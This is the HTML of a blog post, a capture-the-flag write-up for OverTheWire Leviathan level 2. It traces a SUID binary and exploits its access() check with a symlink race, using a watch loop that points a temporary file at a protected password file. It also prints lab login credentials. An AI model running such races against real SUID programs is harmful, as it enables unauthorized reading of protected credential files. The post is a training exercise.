@@ -1,0 +1,280 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+  <meta name="robots" content="noodp,noydir">
+  <meta name="pinterest" content="nopin">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/brand/favicon.png">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="apple-touch-icon" href="/image/brand/icon-1-1.png">
+  <link rel="canonical" href="https://l1ge.github.io/leviathan2/">
+  
+<link rel="preload" as="style" href="/bundle.css?v=1588682122" media="all">
+<link rel="stylesheet" href="/bundle.css?v=1588682122" media="all">
+
+
+
+<title>OverTheWire: Leviathan 2 Write-Up : l1ge&#39;s cabin</title>
+
+<meta property="og:title" content="OverTheWire: Leviathan 2 Write-Up">
+<meta property="og:site_name" content="l1ge&#39;s cabin">
+<meta property="og:url" content="https://l1ge.github.io/leviathan2/">
+<link rel="image_src" href="https://l1ge.github.io/image/page-default.webp">
+<meta property="og:image" content="https://l1ge.github.io/image/page-default.webp">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_us">
+<meta property="og:description" content="There are plenty of write-ups out there for Leviathan&#39;s Level 2. But none of them solved it the way I did: the fun way! Let&#39;s first access the level  ssh -p 2223 leviathan2@leviathan.labs.overthewire.org password: ougahZi8Ta  In the home folder there is an executable named printfile.">
+<meta name="description" content="There are plenty of write-ups out there for Leviathan&#39;s Level 2. But none of them solved it the way I did: the fun way! Let&#39;s first access the level  ssh -p 2223 leviathan2@leviathan.labs.overthewire.org password: ougahZi8Ta  In the home folder there is an executable named printfile.">
+<meta property="og:updated_time" content="2020-05-04T14:00:00Z">
+<meta property="fb:app_id" content="">
+<meta name="author" content="l1ge">
+<meta property="article:author" content="https://l1ge.github.io">
+<meta property="article:published_time" content="2020-05-04T14:00:00Z">
+<meta property="article:modified_time" content="2020-05-04T14:00:00Z">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "OverTheWire: Leviathan 2 Write-Up",
+  "alternativeHeadline": "Write-up for Leviathan level 2, the FUN way",
+  "url": "https://l1ge.github.io/leviathan2/",
+  "image": "https://l1ge.github.io/image/page-default.webp",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://l1ge.github.io/leviathan2/"
+  },
+  "description": "There are plenty of write-ups out there for Leviathan's Level 2. But none of them solved it the way I did: the fun way! Let's first access the level  ssh -p 2223 leviathan2@leviathan.labs.overthewire.org password: ougahZi8Ta  In the home folder there is an executable named printfile.",
+  "author": {
+    "@type": "Person",
+    "name": "l1ge"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "l1ge's cabin",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://l1ge.github.io/image/brand/icon-1-1.png"
+    }
+  },
+  "datePublished": "2020-05-04T14:00:00Z",
+  "dateModified": "2020-05-04T14:00:00Z",
+  "articleBody": "\u003cp\u003eThere are plenty of write-ups out there for Leviathan's Level 2.  But none of them solved it the way I did: \u003cstrong\u003ethe fun way!\u003c/strong\u003e\nLet's first access the level\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003essh -p 2223 leviathan2@leviathan.labs.overthewire.org\u003c/p\u003e\n\u003cp\u003epassword: ougahZi8Ta\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eIn the home folder there is an executable named \u003ccode\u003eprintfile\u003c/code\u003e. Let's check its permissions\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ls -l\ntotal 8\n-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIt has the SUID bit (s), which means we can run it with the permissions of its owner leviathan3\nGreat! so let's try to print leviathan3 password\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ./printfile /etc/leviathan_pass/leviathan3\nYou cant have that file...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThat would have been too easy. For some reason \u003ccode\u003eprintfile\u003c/code\u003e doesn't allow us to access a file owned by leviathan3 despite the SUID bit. Let's investigate the binary with the command \u003ccode\u003eltrace\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ltrace ./printfile /etc/leviathan_pass/leviathan3\n__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 \u0026lt;unfinished ...\u0026gt;\naccess(\u0026quot;/etc/leviathan_pass/leviathan3\u0026quot;, 4)                         = -1\nputs(\u0026quot;You cant have that file...\u0026quot;You cant have that file...\n)                                  = 27\n+++ exited (status 1) +++\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eI also tried \u003ccode\u003estrace\u003c/code\u003e to check the system calls\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ strace ./printfile /etc/leviathan_pass/leviathan3\nexecve(\u0026quot;./printfile\u0026quot;, [\u0026quot;./printfile\u0026quot;, \u0026quot;/etc/leviathan_pass/leviathan3\u0026quot;], [/* 17 vars */]) = 0\nstrace: [ Process PID=32706 runs in 32 bit mode. ]\nbrk(NULL)                               = 0x804b000\nfcntl64(0, F_GETFD)                     = 0\nfcntl64(1, F_GETFD)                     = 0\nfcntl64(2, F_GETFD)                     = 0\naccess(\u0026quot;/etc/suid-debug\u0026quot;, F_OK)         = -1 ENOENT (No such file or directory)\naccess(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000\naccess(\u0026quot;/etc/ld.so.preload\u0026quot;, R_OK)      = -1 ENOENT (No such file or directory)\nopen(\u0026quot;/etc/ld.so.cache\u0026quot;, O_RDONLY|O_CLOEXEC) = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0\nmmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000\nclose(3)                                = 0\naccess(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(\u0026quot;/lib32/libc.so.6\u0026quot;, O_RDONLY|O_CLOEXEC) = 3\nread(3, \u0026quot;\\177ELF\\1\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0\\204\\1\\0004\\0\\0\\0\u0026quot;..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0\nmmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000\nmmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000\nmmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000\nclose(3)                                = 0\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000\nset_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)\nmprotect(0xf7fc3000, 8192, PROT_READ)   = 0\nmprotect(0x8049000, 4096, PROT_READ)    = 0\nmprotect(0xf7ffc000, 4096, PROT_READ)   = 0\nmunmap(0xf7fc9000, 36357)               = 0\naccess(\u0026quot;/etc/leviathan_pass/leviathan3\u0026quot;, R_OK) = -1 EACCES (Permission denied)\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0\nbrk(NULL)                               = 0x804b000\nbrk(0x806c000)                          = 0x806c000\nwrite(1, \u0026quot;You cant have that file...\\n\u0026quot;, 27You cant have that file...\n) = 27\nexit_group(1)                           = ?\n+++ exited with 1 +++\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo be honest, I don't understand what most of this means, but one line is pretty straightforward :\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaccess(\u0026quot;/etc/leviathan_pass/leviathan3\u0026quot;, R_OK) = -1 EACCES (Permission denied)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThere is an \u003cem\u003eaccess()\u003c/em\u003e function that checks if I can access the file. Let's investigate how that function works.\nFrom this \u003ca href=\"https://linux.die.net/man/2/access\"\u003elink\u003c/a\u003e I get a few interesting informations:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eOK now I understand why, despite the SUID bit on the \u003ccode\u003eprintfile\u003c/code\u003e, I can't access the password file.\nI keep reading and stumble upon a serious lead :\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eWarning\u003c/strong\u003e: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eI like that!\nI decide to Google more and I discovered that this kind of vulnerabilities was called \u003cstrong\u003eTOCTOU\u003c/strong\u003e (Time-of-check to time-of-use) and was mostly abused using symlinks.\u003c/p\u003e\n\u003cp\u003eThe idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?\u003c/p\u003e\n\u003cp\u003eThat's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.\u003c/p\u003e\n\u003cp\u003eInstead I did it... manually.\u003c/p\u003e\n\u003cp\u003eI used \u003ccode\u003etmux\u003c/code\u003e to be able to launch two commands simultaneously. You can also use \u003ccode\u003escreen\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$watch -n 0.1 \u0026quot;touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis command runs every 0.1 seconds with\u003ccode\u003ewatch -n 0.1\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003etouch /tmp/l1ge/lev3\u003c/code\u003e - creates a file \u003cem\u003elev3\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3\u003c/code\u003e  - Creates a symlink on \u003cem\u003elev3\u003c/em\u003e targetting leviathan3's password file\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003erm /tmp/l1ge/lev3\u003c/code\u003e - Deletes \u003cem\u003elev3\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo sum up, every 0.1 seconds it creates a file with permissions that can pass the \u003cem\u003eaccess()\u003c/em\u003e function, symlinks it to the file we really wanna access, deletes it and start all over again.\u003c/p\u003e\n\u003cp\u003eMy plan is to run \u003ccode\u003e./printfile\u003c/code\u003e on my \u003cem\u003elev3\u003c/em\u003e file repeatedly until it magically sync up perfectly and the symlink happens right between \u003cem\u003eaccess()\u003c/em\u003e reads the permissions and it gets passed to \u003ccode\u003ecat\u003c/code\u003e to print its content.\u003c/p\u003e\n\u003cp\u003eAnd to do that without a script, I'll use my fingers\u003c/p\u003e\n\u003cp\u003eI fire-up another \u003ccode\u003etmux\u003c/code\u003e window and here I go, hitting UP ARROW and ENTER as fast I can to execute randomly the command on repeat.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ ./printfile /tmp/l1ge/lev3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e...until I hope the password magically appears. When you find yourself doing something so stupid on a CTF,  a strong inner voice tells you to give up and never touch a computer again.\u003c/p\u003e\n\u003cp\u003eBUT in less than 1mn the magic happened, that's fast enough to bypass my own pessimism.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/image/leviathan2.jpg\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eOur password is  \u003cstrong\u003eAhdiemoo1j\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThere is of course a most reliable way to solve this level and you can check the other write-ups about it.\u003c/p\u003e\n\u003cp\u003eHope you enjoyed!\u003c/p\u003e\n\u003cp\u003eCheers,\nl1ge.\u003c/p\u003e"
+}
+</script>
+
+<link rel="preload" as="script" href="/bundle.js?v=1588682122">
+<link rel="preconnect" href="https://www.google-analytics.com">
+<link rel="preconnect" href="https://stats.g.doubleclick.net">
+<link rel="preconnect" href="https://www.googleadservices.com">
+<link rel="preload" as="script" href="https://www.googletagmanager.com/gtag/js?id=">
+<script src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer=window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js',new Date());
+  gtag('config','');
+</script>
+
+</head>
+<body>
+  <header id="nav" class="header">
+  <div class="ax-l-i">
+    <div class="ax-logo">
+      <a class="block" href="/" title="l1ge&#39;s cabin"><span class="font-semibold text-raven-900">l1ge's cabin</span></a>
+    </div>
+    <div class="ax-user">
+      <a class="p-2 w-7 h-7 block text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" target="_blank" rel="noopener nofollow" href="https://www.google.com/search?q=site:l1ge.github.io">
+        <svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M2.67 12.804c0-5.6 4.544-10.134 10.133-10.134s10.134 4.544 10.134 10.134-4.544 10.133-10.134 10.133S2.67 18.393 2.67 12.804zm28.943 16.923l-8.868-8.868c4.287-5.3 3.68-13.012-1.378-17.57S8.564-1.066 3.75 3.75s-5.017 12.558-.46 17.618 12.28 5.665 17.57 1.378l8.868 8.868a1.33 1.33 0 0 0 2.231-.597c.123-.46-.008-.952-.345-1.29h0z"/></svg>
+
+      </a>
+      <a class="p-2 block text-sm leading-none text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" href="/posts/">
+        Posts
+      </a>
+      <a class="p-2 block text-sm leading-none text-raven-500 hover:text-gray-800 focus:text-gray-800 focus:outline-none" href="/contact/">
+        Contact
+      </a>
+    </div>
+  </div>
+
+  
+</header>
+
+  <main>
+<div class="default-single">
+  <div class="ax-header ax-l-o">
+    <div class="ax-l-i">
+      <h1 class="post-title font-content-title font-normal leading-tight tracking-default text-40">OverTheWire: Leviathan 2 Write-Up</h1>
+      <p class="post-subtitle font-content-sans font-light text-xl text-raven-500 mt-3">Write-up for Leviathan level 2, the FUN way</p>
+
+      <div class="ax-meta flex items-center mt-5">
+        <div class="flex-grow min-w-0">
+          <div class="flex items-center">
+  <div class="flex-shrink-0">
+    <img
+    class="w-12 h-12 sm:w-14 sm:h-14 object-cover p-05 rounded-full border border-blue-300"
+    src="/image/author/default.webp"
+    alt="l1ge">
+  </div>
+  <div class="flex-shrink-0 ml-2 leading-tight font-content-sans">
+    <a class="block text-sm text-raven-800 hover:text-raven-900 hover:underline focus:underline" target="_blank" rel="noopener nofollow" title="l1ge" href="https://l1ge.github.io">l1ge</a>
+    <time class="text-sm text-raven-500" datetime="2020-05-04T14:00:00Z">May 4, 2020 4:00PM</time>
+  </div>
+</div>
+
+        </div>
+        <div>
+          <div class="flex items-center">
+  <a class="flex-shrink-0 block text-raven-800 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Share on Twitter" href="https://twitter.com/intent/tweet?text=OverTheWire%3a%20Leviathan%202%20Write-Up%20by%20%40%25%21s%28%3cnil%3e%29%20https%3a%2f%2fl1ge.github.io%2fleviathan2%2f"><svg class="w-6 h-6 fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M32 6.078c-1.2.522-2.458.868-3.78 1.036 1.36-.812 2.398-2.088 2.886-3.626a13.11 13.11 0 0 1-4.16 1.588C25.742 3.794 24.026 3 22.154 3a6.56 6.56 0 0 0-6.556 6.562c0 .52.044 1.02.152 1.496-5.454-.266-10.28-2.88-13.522-6.862-.566.982-.898 2.106-.898 3.316a6.57 6.57 0 0 0 2.914 5.452 6.48 6.48 0 0 1-2.964-.808v.072c0 3.188 2.274 5.836 5.256 6.446-.534.146-1.116.216-1.72.216-.42 0-.844-.024-1.242-.112.85 2.598 3.262 4.508 6.13 4.57a13.18 13.18 0 0 1-8.134 2.798c-.538 0-1.054-.024-1.57-.1C2.906 27.93 6.35 29 10.064 29c12.072 0 18.672-10 18.672-18.668 0-.3-.01-.57-.024-.848C30.014 8.56 31.108 7.406 32 6.078z"/></svg>
+</a>
+  <a class="ml-3 flex-shrink-0 block text-raven-800 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Share on Facebook" href="https://www.facebook.com/dialog/share?app_id=&display=page&href=https%3a%2f%2fl1ge.github.io%2fleviathan2%2f"><svg class="w-6 h-6 fill-current" viewBox="-7 -3.5 39 39" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M30.234 0H1.765C.8.001 0 .79 0 1.766v28.47C.001 31.2.79 32 1.766 32h15.328V19.625h-4.156V14.78h4.156v-3.564c0-4.134 2.523-6.384 6.21-6.384 1.766 0 3.284.13 3.726.2v4.32h-2.543c-2.006 0-2.394.953-2.394 2.352v3.085h4.797l-.625 4.844h-4.172V32h8.14C31.21 32 32 31.2 32 30.234V1.765C32 .8 31.21 0 30.234 0z"/></svg>
+</a>
+</div>
+
+        </div>
+      </div>
+    </div>
+  </div><div class="ax-content ax-l-o">
+    <div class="ax-l-i">
+      <article class="cdata">
+<p>There are plenty of write-ups out there for Leviathan's Level 2.  But none of them solved it the way I did: <strong>the fun way!</strong>
+Let's first access the level</p>
+<blockquote>
+<p>ssh -p 2223 leviathan2@leviathan.labs.overthewire.org</p>
+<p>password: ougahZi8Ta</p>
+</blockquote>
+<p>In the home folder there is an executable named <code>printfile</code>. Let's check its permissions</p>
+<pre><code class="language-bash">$ ls -l
+total 8
+-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
+</code></pre>
+<p>It has the SUID bit (s), which means we can run it with the permissions of its owner leviathan3
+Great! so let's try to print leviathan3 password</p>
+<pre><code class="language-bash">$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+</code></pre>
+<p>That would have been too easy. For some reason <code>printfile</code> doesn't allow us to access a file owned by leviathan3 despite the SUID bit. Let's investigate the binary with the command <code>ltrace</code></p>
+<pre><code class="language-bash">$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 &lt;unfinished ...&gt;
+access(&quot;/etc/leviathan_pass/leviathan3&quot;, 4)                         = -1
+puts(&quot;You cant have that file...&quot;You cant have that file...
+)                                  = 27
++++ exited (status 1) +++
+</code></pre>
+<p>I also tried <code>strace</code> to check the system calls</p>
+<pre><code class="language-bash">$ strace ./printfile /etc/leviathan_pass/leviathan3
+execve(&quot;./printfile&quot;, [&quot;./printfile&quot;, &quot;/etc/leviathan_pass/leviathan3&quot;], [/* 17 vars */]) = 0
+strace: [ Process PID=32706 runs in 32 bit mode. ]
+brk(NULL)                               = 0x804b000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
+mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
+close(3)                                = 0
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib32/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0&quot;..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
+mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
+mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
+mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
+close(3)                                = 0
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
+set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
+munmap(0xf7fc9000, 36357)               = 0
+access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0
+brk(NULL)                               = 0x804b000
+brk(0x806c000)                          = 0x806c000
+write(1, &quot;You cant have that file...\n&quot;, 27You cant have that file...
+) = 27
+exit_group(1)                           = ?
++++ exited with 1 +++
+</code></pre>
+<p>To be honest, I don't understand what most of this means, but one line is pretty straightforward :</p>
+<pre><code class="language-bash">access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
+</code></pre>
+<p>There is an <em>access()</em> function that checks if I can access the file. Let's investigate how that function works.
+From this <a href="https://linux.die.net/man/2/access">link</a> I get a few interesting informations:</p>
+<blockquote>
+<p>The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.</p>
+</blockquote>
+<p>OK now I understand why, despite the SUID bit on the <code>printfile</code>, I can't access the password file.
+I keep reading and stumble upon a serious lead :</p>
+<blockquote>
+<p><strong>Warning</strong>: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
+</blockquote>
+<p>I like that!
+I decide to Google more and I discovered that this kind of vulnerabilities was called <strong>TOCTOU</strong> (Time-of-check to time-of-use) and was mostly abused using symlinks.</p>
+<p>The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?</p>
+<p>That's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.</p>
+<p>Instead I did it... manually.</p>
+<p>I used <code>tmux</code> to be able to launch two commands simultaneously. You can also use <code>screen</code></p>
+<pre><code class="language-bash">$watch -n 0.1 &quot;touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3&quot;
+</code></pre>
+<p>This command runs every 0.1 seconds with<code>watch -n 0.1</code></p>
+<ul>
+<li><code>touch /tmp/l1ge/lev3</code> - creates a file <em>lev3</em></li>
+<li><code>ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3</code>  - Creates a symlink on <em>lev3</em> targetting leviathan3's password file</li>
+<li><code>rm /tmp/l1ge/lev3</code> - Deletes <em>lev3</em></li>
+</ul>
+<p>To sum up, every 0.1 seconds it creates a file with permissions that can pass the <em>access()</em> function, symlinks it to the file we really wanna access, deletes it and start all over again.</p>
+<p>My plan is to run <code>./printfile</code> on my <em>lev3</em> file repeatedly until it magically sync up perfectly and the symlink happens right between <em>access()</em> reads the permissions and it gets passed to <code>cat</code> to print its content.</p>
+<p>And to do that without a script, I'll use my fingers</p>
+<p>I fire-up another <code>tmux</code> window and here I go, hitting UP ARROW and ENTER as fast I can to execute randomly the command on repeat.</p>
+<pre><code class="language-bash">$ ./printfile /tmp/l1ge/lev3
+</code></pre>
+<p>...until I hope the password magically appears. When you find yourself doing something so stupid on a CTF,  a strong inner voice tells you to give up and never touch a computer again.</p>
+<p>BUT in less than 1mn the magic happened, that's fast enough to bypass my own pessimism.</p>
+<p><img src="/image/leviathan2.jpg" alt=""></p>
+<p>Our password is  <strong>Ahdiemoo1j</strong></p>
+<p>There is of course a most reliable way to solve this level and you can check the other write-ups about it.</p>
+<p>Hope you enjoyed!</p>
+<p>Cheers,
+l1ge.</p>
+
+      </article>
+      
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="footer">
+  <div class="ax-l-i">
+    <nav class="flex items-center justify-center">
+      <a class="ml-3 first:ml-0 text-sm text-gray-600 hover:text-gray-800" href="/posts/">Posts</a>
+      <a class="ml-3 first:ml-0 text-sm text-gray-600 hover:text-gray-800" href="/contact/">Contact</a>
+    </nav>
+    <div class="footer-social flex items-center justify-center mt-4">
+      <a class="block mx-3 w-6 h-6 text-raven-700 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Twitter" href="https://twitter.com/the_l1ge"><svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M32 6.078c-1.2.522-2.458.868-3.78 1.036 1.36-.812 2.398-2.088 2.886-3.626a13.11 13.11 0 0 1-4.16 1.588C25.742 3.794 24.026 3 22.154 3a6.56 6.56 0 0 0-6.556 6.562c0 .52.044 1.02.152 1.496-5.454-.266-10.28-2.88-13.522-6.862-.566.982-.898 2.106-.898 3.316a6.57 6.57 0 0 0 2.914 5.452 6.48 6.48 0 0 1-2.964-.808v.072c0 3.188 2.274 5.836 5.256 6.446-.534.146-1.116.216-1.72.216-.42 0-.844-.024-1.242-.112.85 2.598 3.262 4.508 6.13 4.57a13.18 13.18 0 0 1-8.134 2.798c-.538 0-1.054-.024-1.57-.1C2.906 27.93 6.35 29 10.064 29c12.072 0 18.672-10 18.672-18.668 0-.3-.01-.57-.024-.848C30.014 8.56 31.108 7.406 32 6.078z"/></svg></a>
+      <a class="block mx-3 w-6 h-6 text-raven-700 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Github" href="https://github.com/l1ge"><svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M15.998 0C7.164 0 0 7.35 0 16.417 0 23.67 4.584 29.82 10.944 31.994c.8.15 1.092-.356 1.092-.79l-.022-2.792c-4.45.99-5.4-2.202-5.4-2.202-.726-1.896-1.776-2.4-1.776-2.4-1.454-1.018.108-.998.108-.998 1.606.117 2.45 1.693 2.45 1.693 1.428 2.507 3.746 1.784 4.658 1.363.144-1.06.558-1.784 1.016-2.195-3.552-.415-7.288-1.823-7.288-8.113 0-1.792.624-3.258 1.648-4.406-.166-.415-.714-2.085.156-4.344 0 0 1.344-.44 4.4 1.683 1.276-.364 2.644-.546 4.006-.552a14.98 14.98 0 0 1 4.006.554C23.062 6.37 24.404 6.8 24.404 6.8c.872 2.26.324 3.93.16 4.344 1.026 1.148 1.644 2.614 1.644 4.406 0 6.306-3.74 7.694-7.304 8.1.574.507 1.086 1.51 1.086 3.04l-.02 4.503c0 .44.288.95 1.1.788C27.42 29.817 32 23.667 32 16.417 32 7.35 24.836 0 15.998 0z"/></svg></a>
+    </div>
+
+    <div class="footer-copyright text-sm text-center text-gray-500 mt-4">
+      &#169; 2020-2020 l1ge&#39;s cabin
+    </div>
+
+    <div class="text-sm sm:text-xs text-center text-gray-500 mt-2">
+      Powered by <a href="https://github.com/marketempower/axiom">Axiom</a>
+    </div>
+  </div>
+</footer>
+
+<script src="/bundle.js?v=1588682122"></script>
+<script defer src="/prism.js?v=1588682122"></script>
+</body>
+</html>
